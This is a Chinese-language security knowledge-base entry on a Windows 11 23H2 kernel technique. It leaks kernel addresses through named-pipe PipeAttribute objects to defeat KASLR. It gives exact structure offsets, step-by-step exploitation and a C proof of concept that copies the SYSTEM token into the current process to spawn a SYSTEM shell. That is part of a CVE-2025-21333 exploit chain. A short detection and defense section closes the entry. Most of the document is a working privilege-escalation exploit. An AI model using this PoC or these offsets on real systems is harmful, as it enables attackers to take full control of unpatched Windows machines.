---
id: binary-pwn-kernel-windows-pipe-attribute-np-ccb-kaslr-leak
title: Windows 命名管道 Attribute 泄露 _NP_CCB：Flink → FileObject → DriverObject → NpFsdCreate 恢复内核基址
type: scenario
domain: binary
path: binary/pwn/kernel
technique: windows-pipe-attribute-np-ccb-kaslr-leak
aliases:
- 管道 Attribute KASLR
- PipeAttribute Flink
- _NP_CCB FileObject
- NpFsdCreate 偏移
- ntoskrnl 基址泄露
- NtFsControlFile 0x11003C
- NpAt tag
tags:
- windows
- kernel
- pwn
- kaslr
- named-pipe
- npfs
- pipe-attribute
- info-leak
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V180
  verified_at: '2026-11-06T17:37:35+08:00'
  notes: 已对照原文与图67/69/70核对：NtFsControlFile 0x11003C 创建 PipeAttribute('NpAt')、Flink-0x130 到 _NP_CCB、FileObject[2] @+0x20、+8/+8/+0x70 取 NpFsdCreate、0xcfc0/0x7050/0xaaa3b0/0xd1ea60/0x4b8 偏移均一致；未在本机复跑
---

## 一句话结论

在命名管道上调用 `NtFsControlFile(..., 0x11003C, Attribute, ...)` 会在分页池创建 `PipeAttribute`（PoolTag `'NpAt'`），其 `LIST_ENTRY.Flink` 指向 `_NP_CCB`（偏移 `+0x130`）；`_NP_CCB` 内有 `FileObject` 指针，沿 `FileObject+0x8 → DeviceObject+0x8 → DriverObject+0x70 (MajorFunction[IRP_MJ_CREATE])` 可读出 `NpFsdCreate`，再按 npfs/ntoskrnl 的固定偏移算出 `ExAllocatePool2` 与 `System EPROCESS`，完成 KASLR 绕过。

## 原理

- **PipeAttribute 创建**：`NtFsControlFile` 对命名管道写句柄发送 FSCTL `0x11003C`，`npfs.sys!NpSetAttribute` 在分页池分配 `PipeAttribute` 结构（池 Tag `'NpAt'`，即 0x7441704e），初始化双向链表；该结构的 `Flink` 指向 `_NP_CCB` 的链表节点。
- **偏移 0x130**：`NpSetAttribute` 中 `v16 = v13 + 0x130` 把 Attribute 链接到 CCB 的链表；因此从 Attribute 的 `Flink` 减去 `0x130` 可回到 `_NP_CCB` 基址（`_NP_CCB` 是 npfs 私有结构，ReactOS 旧版本有类似定义）。
- **FileObject 指针**：`_NP_CCB` 结构包含 `PFILE_OBJECT FileObject[2]`（示例偏移 `+0x20`）；读取该指针得到 `FileObject`。
- **对象链**：`_FILE_OBJECT+0x8` 是 `DeviceObject`，`_DEVICE_OBJECT+0x8` 是 `DriverObject`，`_DRIVER_OBJECT+0x70` 是 `MajorFunction[IRP_MJ_CREATE]`。对命名管道驱动，该槽位是 `npfs.sys!NpFsdCreate`。
- **基址计算**：`NpFsdCreate` 的 RVA 在目标版本已知（示例 `0xcfc0`），`npfs` 基址 = `NpFsdCreate - 0xcfc0`；GOT/IAT 中 `ExAllocatePool2` 槽位偏移示例 `0x7050`，读取该槽位得到 `ExAllocatePool2` 地址。
- **ntoskrnl 与 System EPROCESS**：`ExAllocatePool2` 在 ntoskrnl 的 RVA 示例 `0xaaa3b0`，`InitialSystemProcess` 偏移示例 `0xd1ea60`，则 `SystemEPROCESS = ExAllocatePool2 - 0xaaa3b0 + 0xd1ea60`；读取 `SystemEPROCESS+0x4b8` 得 system token（低 4 位对齐 `& ~0xf`）。
- **为什么有效**：`MajorFunction` 表是驱动对象中的函数指针数组，位置固定、内容为内核代码地址；通过它反推模块基址是 Windows 内核 KASLR 绕过的经典方法。前提是攻击者已有任意读，能读取管道 Attribute 所在池块及后续对象。
- **版本依赖**：`0x11003C` FSCTL、`0x130`、`FileObject` 偏移、`NpFsdCreate 0xcfc0`、`GOT 0x7050`、`ExAllocatePool2 0xaaa3b0`、`InitialSystemProcess 0xd1ea60`、`Token 0x4b8` 均为原文 Windows 11 23H2 22631.4460 的偏移；其他版本需重新逆向。

## 触发条件

- 目标为 Windows 11 23H2 22631.4460 或偏移匹配的版本；攻击者拥有任意读原语（如 I/O Ring + 管道）。
- 能创建命名管道并调用 `NtFsControlFile`（FSCTL `0x11003C`）创建 PipeAttribute。
- 能定位/读取 PipeAttribute 所在的内核池块（示例通过 WNF 挖洞把 Attribute 填入已知地址，再用 `NtQueryWnfStateData` 读回）。
- `npfs.sys`/`ntoskrnl.exe` 未被阻止读取，且目标未启用阻止用户态任意读的缓解（如 HVCI 下的只读页表等）。
- 偏移与目标 build 匹配；不匹配会导致读到错误地址/BSOD。

## 利用步骤

1. 创建大量命名管道（示例 0x500 对服务端/客户端），用 `NtFsControlFile(pipe_write, ..., 0x11003C, Attribute, 0x18, output, 0x100)` 创建 PipeAttribute；Attribute 缓冲区首字节设为 `'K'`、次字节 0，便于识别。
2. 通过池布局（WNF 挖洞 + 填充）把某个 PipeAttribute 放到已知/可读的池块中，读出包含 `'NpAt'` 池头的整块数据。
3. 取 `PipeAttribute.Flink`（池头后第一个 8 字节），计算 `_NP_CCB = Flink - 0x130`，再读 `_NP_CCB+0x20` 得 `FileObject`。
4. 任意读 `FileObject+0x8` 得 `DeviceObject`，读 `DeviceObject+0x8` 得 `DriverObject`，读 `DriverObject+0x70` 得 `NpFsdCreate`。
5. 计算 `npfs_base = NpFsdCreate - 0xcfc0`，读 `npfs_base + 0x7050` 得 `ExAllocatePool2`。
6. 计算 `SystemEPROCESS = ExAllocatePool2 - 0xaaa3b0 + 0xd1ea60`，读 `+0x4b8` 得 system token。
7. 遍历 `ActiveProcessLinks`（`+0x448`）按 `UniqueProcessId`（`+0x440`）找到当前进程，任意写 `+0x4b8` 替换 token，提权到 SYSTEM。

## PoC

```c
// 1. 创建 PipeAttribute
size_t Attribute_size = 0x50 - 0x38;      // 0x18
unsigned char* Attribute = new unsigned char[0x1000];
memset(Attribute, 0x41, 0x1000);
Attribute[0] = 'K'; Attribute[1] = '\0';

NtFsControlFile(spray_pipe_handle[i].pipe_write, NULL, NULL, NULL,
                &status, 0x11003C, Attribute, Attribute_size,
                output, 0x100);

// 2. 从内核读出 PipeAttribute 池块后：
DWORD64 pipeAttributeFlink = *(DWORD64*)(P_ptr + sizeof(POOL_HEADER));
DWORD64 file_object_ptr = pipeAttributeFlink - 0x130 + 0x20;

DWORD64 fileobject = 0, deviceobject = 0, driverobject = 0, NpFsdCreate = 0;
KRead((PVOID)file_object_ptr, (PBYTE)&fileobject, sizeof(fileobject));
KRead((PVOID)(fileobject + 0x8), (PBYTE)&deviceobject, sizeof(deviceobject));
KRead((PVOID)(deviceobject + 0x8), (PBYTE)&driverobject, sizeof(driverobject));
KRead((PVOID)(driverobject + 0x70), (PBYTE)&NpFsdCreate, sizeof(NpFsdCreate));

DWORD64 ExAllocatePool2 = 0, systemEPROCESS = 0, systemToken = 0;
KRead((PVOID)(NpFsdCreate - 0xcfc0 + 0x7050),
      (PBYTE)&ExAllocatePool2, sizeof(ExAllocatePool2));
KRead((PVOID)(ExAllocatePool2 - 0xaaa3b0 + 0xd1ea60),
      (PBYTE)&systemEPROCESS, sizeof(systemEPROCESS));
KRead((PVOID)(systemEPROCESS + 0x4b8),
      (PBYTE)&systemToken, sizeof(systemToken));
systemToken &= 0xfffffffffffffff0;

// 3. 遍历 ActiveProcessLinks 找到当前进程并替换 token
DWORD64 cur = systemEPROCESS, pid = 0, curpid = GetCurrentProcessId();
while (1) {
    KRead((PVOID)(cur + 0x440), (PBYTE)&pid, sizeof(pid));
    if (pid == curpid) break;
    KRead((PVOID)(cur + 0x448), (PBYTE)&cur, sizeof(cur));
    cur -= 0x448;
}
KWrite((PVOID)(cur + 0x4b8), (PBYTE)&systemToken, sizeof(systemToken));
system("cmd.exe");
```

原文在 CVE-2025-21333 利用中通过该路径得到 system token，`whoami` 输出 `nt authority\system`；PoC 未在本机复跑。

## 变体与关联

- 泄漏对象变体：其他驱动的 `MajorFunction` 表、`DriverObject->DriverUnload`、`DeviceObject->DriverObject` 均可用于反推基址；不同管道 FSCTL/结构偏移不同。
- 定位变体：若不使用 WNF 挖洞，也可用其他池喷射/任意读直接扫描 `'NpAt'`/`'NpFs'` 池 Tag。
- 关联：[[binary-pwn-kernel-windows-io-ring-pipe-arbitrary-rw]]（任意读原语）、[[binary-pwn-kernel-windows-wnf-paged-pool-spray-hole-digging]]（池布局）、[[binary-pwn-kernel-cve-2025-21333-vkrnlintvsp-dacl-truncation-pool-overflow]]（完整利用）。
- 边界：HVCI/内核 CFG/池加密可能使读出的指针不可用；偏移不匹配会失败；目标限制 `NtFsControlFile` 时无法创建 Attribute。

## 检测与防御

- 检测：大量 `NtFsControlFile` FSCTL `0x11003C` 调用；命名管道 Attribute 数量异常；内核池出现大量 `'NpAt'` 块；随后出现对 `MajorFunction`/`EPROCESS` 的异常读取。
- 防御：及时安装 Windows 补丁；限制普通用户创建大量命名管道/Attribute；启用 HVCI 与内核地址随机化增强；监控异常内核内存读取。
- 加固：对 `NtFsControlFile` 属性接口做配额与审计；避免在可被低权限用户读取的池块中存放敏感指针（池加密/隔离）。
